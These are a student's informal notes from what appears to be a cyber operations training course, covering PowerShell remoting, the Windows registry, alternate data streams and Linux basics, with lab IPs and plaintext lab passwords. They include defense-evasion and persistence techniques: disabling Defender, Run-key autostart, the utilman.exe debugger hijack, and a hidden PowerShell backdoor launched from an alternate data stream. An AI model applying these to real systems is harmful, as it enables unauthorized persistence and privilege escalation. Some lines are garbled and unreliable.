LOGIN/DAILY SUTFF:
ssh student@10.50.38.82 -Y      (LIN-OPS)   # linop=
xfreerdp /u:student /v:10.50.36.193 /dynamic-resolution +glyph-cache +clipboard   (WIN-OPS)
xfreerdp /u:student /v:10.50.39.203 /dynamic-resolution +glyph-cache +clipboard    (Admin-Station; student:password)
                    File-server (ssh) :10.19.0.3 (andy.dwyer:BurtMacklinFBI)
                    
CTFD: http://10.50.22.25:8000/


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
QoL Notes:
Start-Transcript -path .\Day1_notes.txt -append       ### save every command and output typed in powershell to new file
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DAY1: POWERHSLL BASICS
https://os.cybbh.io/public/os/latest/002_powershell/pwsh_fg.html

Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles'   # Queries current network profiles.

Remoting Security:
Get-Item WSMan:\localhost\client\TrustedHosts                                      # Query trusted hosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server01"                    # Adding a single item to TrustedHosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server01,Server02,127.0.0.1"      # Adding multiple items
                                                     
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "Server03" -Concatenate       # Appends the Value instead of changing it

#temp session:
Invoke-Command -ComputerName File-Server {Get-Service}                                      # Creates 1-to-1 Temporary Session
Invoke-Command -ComputerName File-Server,Domain-Controll,Workstation2 {Get-Service} -asjob  # Running a Temporary Session as a Job 
                                                                        C:\'location of script on our PC'   ; copies over that script to those computers, 
                                                                            executes and displays results on our screen
Receive-Job <job #>                                                                         # Displays the job's Results


new-pssession -computername (-port -name -credential)   ### like ssh to another PC      (name, fqdn, netbios, servername)


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

DAY2: WINDOWS REGISTRY
https://os.cybbh.io/public/os/latest/004_windows_registry/reg_fg.html
regedit


Creating new registies in PWSH: Recommended
Set-MpPreference -DisableRealtimeMonitoring $TRUE
new-item "registry path" -name ".fuk " -force -ErrorAction SilentlyContinue
new-itemproperty "registry path\.fuk" -name '(Default)' -PropertyType String -Value 'exefile' -Force -ErrorAction SilentlyContinue | out-null
new-itemproperty "registry path\.fuk" -name 'Content Type' -propertytype String -Value 'application/x-msdownload' -force -ErrorAction Silentlycontinue | out-null

get-item "new registry path"

Querying:
gci           gets the subkeys, ex 'gci HKLM:\'     'gxi HKLM:\ -recurse' get everything and data/properties
get-itemproperty    
get-item        just the key and not any subitems only entries, ex 'get-item HKLM:\'

Modifying:
set-itemproperty        Set-ISER is the copy of the logged in userâ€™s registemProperty -path <keypath> -name " " -Value " " ; leaves less logs than new-itemproperty (same syntax with new-itemproperty, leaves logs by default   )
remove-itemproperty

get-psdrive         # to see mounts, includes registry roots/hivekeys
add-content -value "new-psdrive -name HKU -psprovider Registry -root HKEY_Users" $profile.AllUsersAllhosts   # mounts that key
^ stuff outside the quotes permanetly adds it                                     &$profile.allusersallhosts
get-item -path registry::Key_Users\*\<path>     # gets all the users info of that path
                HKU:\*\path       ^ does the same thing, but without creating the new psdrive







Using 'reg': Not recommended
reg /?                    #Displays help for all of the reg.exe commands
reg query /?              #Displays help for the `reg query`
reg add /?                #Displays help for `reg add`
reg delete /?             #Displays help for `reg delete`

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme /t REG_SZ /d C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                                                           /v ;name  /t ; datatype/propertytype /d ; directory that you want the registry to run
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme




Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
  ### shows all the users who logged in

Priv Esc1:
Set-MpPreference -DisableRealtimeMonitoring $TRUE     ### do this first to allow this 
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
  ###new key 'utilman.exe'; stringvalue 'Debugger; modify, valuedata: C:\Windows\System32\cmd.exe 
                                  ###means of persistence, inherits users priv, useful for priv esc,  ->.ie lock the screen then open ease of use
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Alternate Data Streams:
## doesnt acutally modify og file directly, the md5 doesnt change

CMD:
ex1: C:\windows\system32>echo social security numbers > reminder.txt:secret.info
ex2: 
  echo "text" > <file>:<streamfile>     ###creates alt data stream
  notepad <file>:<streamfile>   #views content  
'dir /R' displays the ADS info of a file typically hidden







PWSH: 
ex1: set-Content .\reminder.txt -Value "social security numbers" -Stream secret.info 
PS Get-Item reminder.txt -Stream *  Get-Item with the -Stream option allows us to see 
                                                         all streams for *reminder.txt.
ex2:
  get-item <file> -Stream * or <ads file>
  gci <path> | foreach-object {get-item $_.FullName -Stream *} | where {$_.Stream -ne $DATA} } | get-content
  set-content <path> -Value "txt" -Stream <ads file>
  
add-content -passthru <path> -value 'wget IPADDr:445/file.exe -outfile 'location of file to put' 
persistence:
new-itemproperty -path HKLM...currentversion\run -name 'name' -propertytype String -value 'C:\powerhsell.exe' -windowstyle hidden - noprofile -command "Get-content C:\uploaded backdoor" -stream script | foreach { powershell -windowstyle hidden -noprofile $_ } " -force -erroraction silentlycontinue
                        HKEY_Users...^
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------





DAY 3: LINUX ESSENTIALS
ctrl alt t = terminal
vim .ssh/config

###Quick box login
Host linops
    HostName 10.50.38.82
    user student
    port 22
chmod 600 .ssh/config
ssh-keygen (enter, enter, enter)
ssh-copy-id linops
ssh linops -> gets you to the linops station w/out authentication
###
vim .bash_aliases
alias sshops='ssh linops -X terminator&'
source .bashrc      ->  then command sshops to pen terminator on that hostname from before
###
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Situational Awareness:
hostname, uname -a; who, whoami/id

sudo -l  ; shows what commnads you can run

w/who, ps-elf ## finds out what is going on
              why/how is things happening?
              what is\in the file of interest?
              
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
File System OTHE BASIC LINUX STUFF: https://refspecs.linuxfoundation.org/FHS_3.0/fhs/index.html
             https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/index.html
/   ##root
/bin (/usr/bin, /usr/local/bin)     ### stores binaries and commands
/sbin (/usr/sbin)     ### stores system binaries
/home     ### default directory for all users
/usr      ### universal system resources; documentation, example files; catch for any files designed to be used on system
/etc      ### everything configurable; system level config files; ssh, bashrc, gnome, cron, systemd
/var      ### thing that are likely to change, like logs, mail
/boot     ### what happens at boot process, contains .img/build files, grub
/dev      ### special or device files; hardware, stderr/in/out. 
/lib      ### shared library images needed by binaries in /bin and /sbin, like .dlls
/media    ### subdirectories used for mount points for removable media
/mnt      ### permanetly attached storage/filesys
/opt      ### add-on application software packages
/run      ### run time nad variable data, mounted at boot, holds info to that session of boot
/tmp      ### temporary files/persistence
/proc     ### method for handling process, sys info, memory info
/etc/group  
/etc/passwd

ETC:

Permissions: u:user, g:group, o:anybody else     ;rwx
750 student:student

find / -perm /2000 2>/dev/null -exec ls -la {} \;       ### 2000 for guid, 4000 for suid, 1000 for sticky bit

SUID: when the file is executed it is by the user who owns it
EUID: effective uid, real user id so cant edit anything else
SGID: same as suid but for groups
Sticky Bit: removes the ability to delete files unless the user attempting is the owner of the file

















